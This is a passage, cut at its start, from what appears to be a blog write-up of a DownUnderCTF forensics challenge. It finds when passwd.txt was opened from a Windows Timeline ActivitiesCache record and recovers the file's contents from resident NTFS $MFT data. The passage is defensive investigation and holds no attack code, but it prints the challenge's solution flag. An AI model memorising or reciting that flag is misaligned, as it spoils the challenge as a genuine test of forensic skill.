<span class="token key atrule">Payload</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>"displayText"<span class="token punctuation">:</span><span class="token string">"passwd.txt"</span><span class="token punctuation">,</span>"activationUri"<span class="token punctuation">:</span><span class="token string">"ms-shellactivity:"</span><span class="token punctuation">,</span>"appDisplayName"<span class="token punctuation">:</span><span class="token string">"Notepad"</span><span class="token punctuation">,</span>"description"<span class="token punctuation">:</span><span class="token string">"C:\\Users\\Challenger\\Desktop\\passwd.txt"</span><span class="token punctuation">,</span>"backgroundColor"<span class="token punctuation">:</span><span class="token string">"black"</span><span class="token punctuation">,</span>"contentUri"<span class="token punctuation">:</span><span class="token string">"file:///C:/Users/Challenger/Desktop/passwd.txt?VolumeId={21D4431B-0000-0000-0000-300300000000}&amp;ObjectId={119740AE-8233-11EB-9779-0800272ADCE0}&amp;KnownFolderId=ThisPCDesktopFolder&amp;KnownFolderLength=27"</span><span class="token punctuation">}</span>
<span class="token key atrule">StartTime</span><span class="token punctuation">:</span> 2021/03/15 08<span class="token punctuation">:</span><span class="token datetime number">25:27</span>
<span class="token key atrule">LastModifiedTime</span><span class="token punctuation">:</span> 2021/03/15 08<span class="token punctuation">:</span><span class="token datetime number">25:27</span>
<span class="token key atrule">LastModifiedOnClient</span><span class="token punctuation">:</span> 2021/03/15 08<span class="token punctuation">:</span><span class="token datetime number">25:27</span>
<span class="token key atrule">ExpirationTime</span><span class="token punctuation">:</span> 2021/04/14 08<span class="token punctuation">:</span><span class="token datetime number">25:27</span>
<span class="token key atrule">IsLocalOnly</span><span class="token punctuation">:</span> <span class="token boolean important">FALSE</span>
<span class="token key atrule">ETag</span><span class="token punctuation">:</span> <span class="token number">25</span>
<span class="token key atrule">PackageIdHash</span><span class="token punctuation">:</span> eUssiHYOx8gt4grLn60pEG2m1QnscYA3695n7jpHJwY=
<span class="token key atrule">PlatformDeviceId</span><span class="token punctuation">:</span> m4BX9Kr6199rI3dn2ELrOcKcapIT5hu1YadnBSQ1yl8=
<span class="token key atrule">TimeZone</span><span class="token punctuation">:</span> Australia/Sydney</span></span></span></code></pre><div id="https://www.notion.so/f5ad0849821d41ce8253e11ce972d88a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We have our winner! The time was </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">08:25:27</strong></span><span class="SemanticString"> when the user first opened the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">passwd.txt</code></span><span class="SemanticString"> file.</span></span></p></div><h3 id="https://www.notion.so/686a343ee8ec42c8afda4f1050f27640" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/686a343ee8ec42c8afda4f1050f27640"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Recovering the file contents from $MFT</span></span></h3><div id="https://www.notion.so/430069e2205b4af99e285dd9c5a6ac7f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Next, let‚Äôs recover the string that was contained in¬†</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">passwd.txt</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/f335cdd5d78c41d796dbc75bf1aff7ff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In the NT file system (NTFS), there is the Master File Table (</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$MFT</code></span><span class="SemanticString">) file located in the volume‚Äôs root directory. The MFT file keeps track of all files on the volume, their logical and physical location on the disk, as well as their metadata such as the time when it was created or its permissions. In cases where the file is very small, the contents of the file can also be stored in the MFT as ‚Äúresident data‚Äù. If the entry for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">passwd.txt</code></span><span class="SemanticString"> still exists in the MFT and the file data has not been overwritten at the time when the disk image was captured, we can recover the file!</span></span></p></div><div id="https://www.notion.so/35f167dce2874b038a6125fd8be0bb9e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Once again, we can do this the hard way by digging through each MFT entry manually, or we can do it the easy way by opening the MFT file using a specialised tool for it. Eric Zimmerman‚Äôs </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.sans.org/tools/mftexplorer/">MFT Explorer</a></span><span class="SemanticString"> is a great tool for this.</span></span></p></div><div id="https://www.notion.so/23658cdbf85a40c68bea25eea328d65d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After opening the MFT file, all we have to do is navigate to where the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">passwd.txt</code></span><span class="SemanticString"> is stored. We saw this previously when extracting the entry from the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ActivitiesCache</code></span><span class="SemanticString"> database: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\Users\Challenger\Desktop\passwd.txt</code></span></span></p></div><div id="https://www.notion.so/fae4d40f6380428e904f608b59be44bf" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F56803e4d-b11f-40ed-8d1f-422cd3993343%2FUntitled.png?width=1762&amp;table=block&amp;id=fae4d40f-6380-428e-904f-608b59be44bf"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F56803e4d-b11f-40ed-8d1f-422cd3993343%2FUntitled.png?width=1762&amp;table=block&amp;id=fae4d40f-6380-428e-904f-608b59be44bf" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><pre id="https://www.notion.so/14bfe801a1d34a06a3ea42a8086ce326" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>**** DATA ****
Type: Data, Attribute #: 0x1, Size: 0x28, Content size: 0xD, Name size: 0x0, Content offset: 0x18, Resident: True

Resident Data
Data: 7B-52-33-73-69-64-65-6E-74-21-61-6C-7D

ASCII: {R3sident!al}</span></span></span></code></pre><div id="https://www.notion.so/7c3dd430b83a4c33a30217e022c89907" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And we have the password! Which turned out to be </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">R3sident!al</code></span><span class="SemanticString"> (without the curly brackets).</span></span></p></div><div id="https://www.notion.so/32ff2b2673ae4a6eb927bdfe9808c2ce" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Flag 2: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">DUCTF{08:25:27_R3sident!al}</code></span></span></p></div><h3 id="https://www.notion.so/ca15fe6c010c4552b732523d565f20af" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/ca15fe6c010c4552b732523d565f20af"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Resources</span></span></h3><ol class="NumberedListWrapper"><li id="https://www.notion.so/030067329895477ab6d6e33c70f1d1f2" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">Windows 10 Timeline ‚Äì Initial Review of Forensic Artefacts - </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://salt4n6.com/2018/05/03/windows-10-timeline-forensic-artefacts/">https://salt4n6.com/2018/05/03/windows-10-timeline-forensic-artefacts/</a></span></span><div id="https://www.notion.so/a302259248944b67bbaa3921c2a3359b" class="Bookmark"><a href="https://salt4n6.com/2018/05/03/windows-10-timeline-forensic-artefacts/"><h5 class="Bookmark__Title">Windows 10 Timeline - Initial Review of Forensic Artefacts</h5><p class="Bookmark__Desc">As you may be aware, there is already a plethora of forensic tools available for producing system timelines, all with their own capabilities and some with limitations. From Sleuth Kits FLS/Mactime, Plaso/Log2timeline, XWF, Axiom, Encase and more recently Timeliner for Volatility.</p><p class="Bookmark__Link">https://salt4n6.com/2018/05/03/windows-10-timeline-forensic-artefacts/</p></a></div></li><li id="https://www.notion.so/d685bbd127114ba7afe0f09db9338baa" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString">Temporary Files Used By SQLite - </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.sqlite.org/tempfiles.html">https://www.sqlite.org/tempfiles.html</a></span></span><div id="https://www.notion.so/6aa7635f556a46cc9d1a1f67a173b446" class="Bookmark"><a href="https://www.sqlite.org/tempfiles.html"><h5 class="Bookmark__Title">Temporary Files Used By SQLite</h5><p class="Bookmark__Desc">One of the distinctive features of SQLite is that a database consists of a single disk file. This simplifies the use of SQLite since moving or backing up a database is a simple as copying a single file. It also makes SQLite appropriate for use as an application file format.</p><p class="Bookmark__Link">https://www.sqlite.org/tempfiles.html</p></a></div></li><li id="https://www.notion.so/9499a9458751495ca09aaaaddb11ed54" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString">Resident $DATA Residue in NTFS MFT Entries - </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.sans.org/blog/resident-data-residue-in-ntfs-mft-entries/">https://www.sans.org/blog/resident-data-residue-in-ntfs-mft-entries/</a></span></span><div id="https://www.notion.so/b886077681b349319a5a66cf8cb99473" class="Bookmark"><a href="https://www.sans.org/blog/resident-data-residue-in-ntfs-mft-entries/"><h5 class="Bookmark__Title">Resident $DATA Residue in NTFS MFT Entries</h5><p class="Bookmark__Desc">I came across a small but interesting artifact in the course of a recent investigation. Quick Google searching failed to find any documentation elsewhere, so here&#x27;s a brief summary of my findings. The bottom line is that residue of old resident $DATA entries may exist in NTFS MFT records after the file data has grown large enough to become a non-resident attribute.</p><p class="Bookmark__Link">https://www.sans.org/blog/resident-data-residue-in-ntfs-mft-entries/</p></a></div></li><li id="https://www.notion.so/135f68981ea147c3a16bdb8b7d20fa8b" class="NumberedList" value="4"><span class="SemanticStringArray"><span class="SemanticString">Eric Zimmerman‚Äôs tools - </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://ericzimmerman.github.io/#!index.md">https://ericzimmerman.github.io/#!index.md</a></span></span><div id="https://www.notion.so/7c0802f8b29a4a8da57e4ada81e761e6" class="Bookmark"><a href="https://ericzimmerman.github.io/#!index.md"><h5 class="Bookmark__Title">Eric Zimmerman&#x27;s tools</h5><p class="Bookmark__Link">https://ericzimmerman.github.io/#!index.md</p></a></div><div id="https://www.notion.so/a2d6721ca34b468bb05377a3553ab43a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div></li></ol></article>
  <footer class="Footer">
  <div>samiko@127.0.0.1~$</div>
  <div>&centerdot;</div>
  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank" rel="noopener noreferrer">Notablog</a>.</div>
</footer>
</body>

</html>